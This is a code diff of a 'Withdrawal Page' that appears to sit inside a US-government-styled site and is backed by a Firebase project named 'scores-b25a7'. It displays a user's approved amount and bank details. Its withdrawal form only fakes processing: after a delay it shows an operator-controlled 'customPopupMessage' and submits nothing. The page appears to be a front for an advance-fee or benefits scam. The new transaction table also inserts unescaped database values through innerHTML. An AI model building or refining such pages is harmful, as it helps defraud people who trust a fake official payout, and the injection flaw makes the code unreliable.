@@ -2319,209 +2319,382 @@
   </nav>
 </header>
 
-  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 20px;
-      background-color: #f4f6f8;
-    }
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>
 
-    h2 {
-      text-align: center;
-      color: #2c3e50;
-      font-size: 25px;
-    }
+    <style>
+        /* Global Styles */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f4f6f8;
+            color: #333;
+        }
 
-    .section {
-      background-color: #fff;
-      padding: 20px;
-      margin-bottom: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-    }
+        h2 {
+            text-align: center;
+            color: #2c3e50;
+            font-size: 26px;
+            margin-bottom: 20px;
+        }
 
-    .form-group {
-      margin-bottom: 15px;
-    }
+        .logout-btn {
+            background-color: #15317E;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            top: 20px;
+            right: 20px;
+            font-size: 14px;
+        }
 
-    label {
-      font-size: 14px;
-      color: #333;
-    }
+        .logout-btn:hover {
+            background-color: #2980b9;
+        }
 
-    input[type="text"] {
-      width: 100%;
-      padding: 8px;
-      font-size: 14px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-    }
+        .section {
+            background-color: #fff;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
 
-    .approved-amount {
-      font-weight: bold;
-      color: green;
-      font-size: 16px;
-      margin-bottom: 10px;
-    }
+        .approved-amount {
+            font-weight: bold;
+            color: #27ae60;
+            font-size: 18px;
+            margin-bottom: 15px;
+        }
 
-    .info-line {
-      font-size: 14px;
-      margin-bottom: 5px;
-    }
+        .info-line {
+            font-size: 14px;
+            margin-bottom: 8px;
+            color: #555;
+        }
 
-    .instructions {
-      background-color: #eef9f0;
-      border-left: 5px solid green;
-      padding: 10px;
-      margin-bottom: 20px;
-      font-size: 14px;
-    }
+        .instructions {
+            background-color: #eef9f0;
+            border-left: 5px solid #27ae60;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            border-radius: 5px;
+        }
 
-    #processingMessage {
-      display: none;
-      font-size: 16px;
-      color: #555;
-      text-align: center;
-      margin-top: 20px;
-    }
+        .form-group {
+            margin-bottom: 20px;
+        }
 
-    button {
-      padding: 10px 20px;
-      background-color: #15317E;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
+        label {
+            font-size: 16px;
+            color: #333;
+        }
 
-    button:hover {
-      background-color: #2980b9;
-    }
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            margin-top: 8px;
+            box-sizing: border-box;
+        }
 
-    .logout-btn {
-      float: right;
-      background-color: #15317E;
-      margin-top: -60px;
-    }
+        button {
+            padding: 12px 25px;
+            background-color: #15317E;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+            transition: background-color 0.3s ease;
+        }
 
-    .logout-btn:hover {
-      background-color: #15317E;
-    }
-  </style>
+        button:hover {
+            background-color: #2980b9;
+        }
+
+        #processingMessage {
+            display: none;
+            font-size: 16px;
+            color: #555;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        /* Transaction History Section */
+        .collapsible {
+            background-color: #f1f1f1;
+            color: #333;
+            cursor: pointer;
+            padding: 12px;
+            width: 100%;
+            border: none;
+            text-align: left;
+            outline: none;
+            font-size: 16px;
+            border-radius: 6px;
+            margin-top: 20px;
+        }
+
+        .collapsible:hover {
+            background-color: #ddd;
+        }
+
+        .active,
+        .collapsible:hover {
+            background-color: #ccc;
+        }
+
+        .content {
+            padding: 18px;
+            display: none;
+            overflow: hidden;
+            background-color: #f9f9f9;
+            border-radius: 6px;
+        }
+
+        .transaction-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+        }
+
+        .transaction-table th,
+        .transaction-table td {
+            padding: 12px;
+            text-align: left;
+            border: 1px solid #ddd;
+        }
+
+        .transaction-table th {
+            background-color: #15317E;
+            color: white;
+        }
+
+        .transaction-table tbody tr:nth-child(even) {
+            background-color: #f2f2f2;
+        }
+
+        tfoot {
+            background-color: #f1f1f1;
+            font-weight: bold;
+        }
+
+        .total {
+            color: #27ae60;
+        }
+
+        /* Mobile responsiveness */
+        @media (max-width: 600px) {
+            h2 {
+                font-size: 22px;
+            }
+
+            .form-group input[type="text"] {
+                font-size: 14px;
+            }
+
+            .logout-btn {
+                font-size: 12px;
+                padding: 8px 16px;
+            }
+
+            button {
+                font-size: 14px;
+            }
+        }
+    </style>
 </head>
+
 <body>
+    <h2>Withdrawal Page</h2>
 
-  <h2>Withdrawal Page</h2>
-  <button class="logout-btn" onclick="logout()">Logout</button>
+    <button class="logout-btn" onclick="logout()">Logout</button>
+    <!-- User Info Section -->
+    <div class="section">
+        <div class="approved-amount" id="approvedAmount">Approved Amount: Loading...</div>
+        <div class="info-line" id="userName">Name: Loading...</div>
+        <div class="info-line" id="bankName">Bank Name: Loading...</div>
+        <div class="info-line" id="accountNumber">Account Number: Loading...</div>
+        <div class="info-line" id="routingNumber">Routing Number: Loading...</div>
+    </div>
 
-  <div class="section">
-    <div class="approved-amount" id="approvedAmount">Approved Amount: Loading...</div>
-    <div class="info-line" id="userName">Name: Loading...</div>
-    <div class="info-line" id="bankName">Bank Name: Loading...</div>
-    <div class="info-line" id="accountNumber">Account Number: Loading...</div>
-    <div class="info-line" id="routingNumber">Routing Number: Loading...</div>
-  </div>
+    <div class="instructions">
+        <strong>Instructions:</strong><br>
+        Enter the amount you wish to withdraw (up to the approved amount). Click "Submit Withdrawal" and your request will be processed shortly.
+    </div>
 
-  <div class="instructions">
-    <strong>Instructions:</strong><br>
-    Enter the amount you wish to withdraw (up to the approved amount). Click "Submit Withdrawal" and your request will be processed shortly.
-  </div>
+    <!-- Transaction Form Section -->
+    <div class="section">
+        <form id="withdrawForm">
+            <div class="form-group">
+                <label for="withdrawAmount">Amount to Withdraw:</label>
+                <input type="text" id="withdrawAmount" name="withdrawAmount" required />
+            </div>
+            <button type="submit">Submit Withdrawal</button>
+        </form>
+    </div>
 
-  <div class="section">
-    <form id="withdrawForm">
-      <div class="form-group">
-        <label for="withdrawAmount">Amount to Withdraw:</label>
-        <input type="text" id="withdrawAmount" name="withdrawAmount" required />
-      </div>
-      <button type="submit">Submit Withdrawal</button>
-    </form>
-  </div>
+    <div id="processingMessage">Processing your request for $<span id="processingAmount"></span>...</div>
 
-  <div id="processingMessage">Processing your request for $<span id="processingAmount"></span>...</div>
+    <!-- Collapsible Transaction History Section -->
+    <div class="section">
+        <button class="collapsible" onclick="toggleTransactionHistory()">Show Transaction History</button>
+        <div class="content" id="transactionHistoryContent">
+            <table class="transaction-table">
+                <thead>
+                    <tr>
+                        <th>Type</th>
+                        <th>Amount</th>
+                        <th>Status</th>
+                        <th>Date Paid</th>
+                    </tr>
+                </thead>
+                <tbody id="transactionHistoryBody">
+                    <!-- Transaction history data will be populated here -->
+                </tbody>
+                <tfoot>
+                    <tr>
+                        <td colspan="3">Total for Paid Transactions:</td>
+                        <td id="totalPaidAmount" class="total">$0.00</td>
+                    </tr>
+                </tfoot>
+            </table>
+        </div>
+    </div>
 
-  <script>
-    const firebaseConfig = {
-      apiKey: "AIzaSyBK5UM0n8-GLvleW7l6B8Hi-_WuC64QA4U",
-      authDomain: "scores-b25a7.firebaseapp.com",
-      databaseURL: "https://scores-b25a7-default-rtdb.firebaseio.com",
-      projectId: "scores-b25a7",
-      storageBucket: "scores-b25a7.appspot.com",
-      messagingSenderId: "1001957936318",
-      appId: "1:1001957936318:web:90fdfb367f82f6a3d8e2ef"
-    };
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBK5UM0n8-GLvleW7l6B8Hi-_WuC64QA4U",
+            authDomain: "scores-b25a7.firebaseapp.com",
+            databaseURL: "https://scores-b25a7-default-rtdb.firebaseio.com",
+            projectId: "scores-b25a7",
+            storageBucket: "scores-b25a7.appspot.com",
+            messagingSenderId: "1001957936318",
+            appId: "1:1001957936318:web:90fdfb367f82f6a3d8e2ef"
+        };
 
-    firebase.initializeApp(firebaseConfig);
+        firebase.initializeApp(firebaseConfig);
 
-    let userApprovedAmount = 0;
+        let userApprovedAmount = 0;
 
-    firebase.auth().onAuthStateChanged(function(user) {
-      if (user) {
-        const uid = user.uid;
+        firebase.auth().onAuthStateChanged(function(user) {
+            if (user) {
+                const uid = user.uid;
 
-        firebase.database().ref("users/" + uid).once("value").then(snapshot => {
-          const data = snapshot.val();
-          if (data) {
-            document.getElementById("userName").innerText = "Name: " + (data.username || "N/A");
-            document.getElementById("bankName").innerText = "Bank Name: " + (data.bankDetails?.bankName || "N/A");
-            document.getElementById("accountNumber").innerText = "Account Number: " + (data.bankDetails?.accountNumber || "N/A");
-            document.getElementById("routingNumber").innerText = "Routing Number: " + (data.bankDetails?.routingNumber || "N/A");
+                firebase.database().ref("users/" + uid).once("value").then(snapshot => {
+                    const data = snapshot.val();
+                    if (data) {
+                        document.getElementById("userName").innerText = "Name: " + (data.username || "N/A");
+                        document.getElementById("bankName").innerText = "Bank Name: " + (data.bankDetails?.bankName || "N/A");
+                        document.getElementById("accountNumber").innerText = "Account Number: " + (data.bankDetails?.accountNumber || "N/A");
+                        document.getElementById("routingNumber").innerText = "Routing Number: " + (data.bankDetails?.routingNumber || "N/A");
 
-            const approved = parseFloat(data.approvedAmount || "0");
-            userApprovedAmount = approved;
-            document.getElementById("approvedAmount").innerHTML = `Approved Amount: <span style="color: green;"><strong>$${approved.toFixed(2)}</strong></span>`;
-          }
-        }).catch(error => {
-          alert("Failed to load user data: " + error.message);
+                        const approved = parseFloat(data.approvedAmount || "0");
+                        userApprovedAmount = approved;
+                        document.getElementById("approvedAmount").innerHTML = `Approved Amount: <span style="color: green;"><strong>$${approved.toFixed(2)}</strong></span>`;
+                    }
+                }).catch(error => {
+                    alert("Failed to load user data: " + error.message);
+                });
+
+                document.getElementById("withdrawForm").addEventListener("submit", function(e) {
+                    e.preventDefault();
+                    const amountInput = document.getElementById("withdrawAmount").value.trim();
+                    const amount = parseFloat(amountInput);
+
+                    if (isNaN(amount) || amount <= 0) {
+                        alert("Please enter a valid amount.");
+                        return;
+                    }
+
+                    if (amount > userApprovedAmount) {
+                        alert("Amount exceeds approved limit. Please enter an amount less than or equal to $" + userApprovedAmount.toFixed(2));
+                        return;
+                    }
+
+                    document.getElementById("processingAmount").innerText = amount.toFixed(2);
+                    document.getElementById("processingMessage").style.display = "block";
+
+                    firebase.database().ref("users/" + firebase.auth().currentUser.uid).once("value").then(snapshot => {
+                        const data = snapshot.val();
+                        const customMessage = data.customPopupMessage || "Please wait while we process your withdrawal.";
+                        const fullMessage = "Your withdrawal request of $" + amount.toFixed(2) + " is being processed.\n\n" + customMessage;
+
+                        setTimeout(() => {
+                            alert(fullMessage);
+                            document.getElementById("processingMessage").style.display = "none";
+                        }, 2000);
+                    }).catch(error => {
+                        alert("Something went wrong: " + error.message);
+                        document.getElementById("processingMessage").style.display = "none";
+                    });
+                });
+
+                // Fetch and display transaction history
+                firebase.database().ref("users/" + uid + "/transactions").on("value", snapshot => {
+                    const transactions = snapshot.val();
+                    const transactionHistoryBody = document.getElementById("transactionHistoryBody");
+                    const totalPaidAmountElement = document.getElementById("totalPaidAmount");
+                    let totalPaidAmount = 0;
+
+                    // Clear the table first
+                    transactionHistoryBody.innerHTML = "";
+
+                    if (transactions) {
+                        let transactionHistoryHtml = '';
+                        for (const transactionKey in transactions) {
+                            const transaction = transactions[transactionKey];
+                            const amount = parseFloat(transaction.amount);
+                            const status = transaction.status || 'N/A';
+
+                            // Check if the transaction status is 'Paid' and calculate total
+                            if (status === "Paid") {
+                                totalPaidAmount += amount;
+                            }
+
+                            transactionHistoryHtml += `
+                                <tr>
+                                    <td>${transaction.type || 'N/A'}</td>
+                                    <td>$${amount.toFixed(2)}</td>
+                                    <td>${status}</td>
+                                    <td>${transaction.datePaid || 'N/A'}</td>
+                                </tr>
+                            `;
+                        }
+                        transactionHistoryBody.innerHTML = transactionHistoryHtml;
+                    } else {
+                        transactionHistoryBody.innerHTML = '<tr><td colspan="4">No transactions found.</td></tr>';
+                    }
+
+                    // Update the total in the table
+                    totalPaidAmountElement.textContent = `$${totalPaidAmount.toFixed(2)}`;
+                });
+
+            } else {
+                window.location.href = "index.html";
+            }
         });
 
-        document.getElementById("withdrawForm").addEventListener("submit", function(e) {
-          e.preventDefault();
-          const amountInput = document.getElementById("withdrawAmount").value.trim();
-          const amount = parseFloat(amountInput);
+        function logout() {
+            firebase.auth().signOut().then(() => {
+                window.location.href = "index.html";
+            });
+        }
 
-          if (isNaN(amount) || amount <= 0) {
-            alert("Please enter a valid amount.");
-            return;
-          }
-
-          if (amount > userApprovedAmount) {
-            alert("Amount exceeds approved limit. Please enter an amount less than or equal to $" + userApprovedAmount.toFixed(2));
-            return;
-          }
-
-          document.getElementById("processingAmount").innerText = amount.toFixed(2);
-          document.getElementById("processingMessage").style.display = "block";
-
-          firebase.database().ref("users/" + firebase.auth().currentUser.uid).once("value").then(snapshot => {
-            const data = snapshot.val();
-            const customMessage = data.customPopupMessage || "Please wait while we process your withdrawal.";
-            const fullMessage = "Your withdrawal request of $" + amount.toFixed(2) + " is being processed.\n\n" + customMessage;
-
-            setTimeout(() => {
-              alert(fullMessage);
-              document.getElementById("processingMessage").style.display = "none";
-            }, 2000);
-          }).catch(error => {
-            alert("Something went wrong: " + error.message);
-            document.getElementById("processingMessage").style.display = "none";
-          });
-        });
-
-      } else {
-        window.location.href = "index.html";
-      }
-    });
-
-    function logout() {
-      firebase.auth().signOut().then(() => {
-        window.location.href = "index.html";
-      });
-    }
-  </script>
+        function toggleTransactionHistory() {
+            const content = document.getElementById("transactionHistoryContent");
+            content.style.display = content.style.display === "block" ? "none" : "block";
+        }
+    </script>
 
 <footer class="usa-footer usa-footer--big ">
   <div class="grid-container usa-footer__return-to-top">
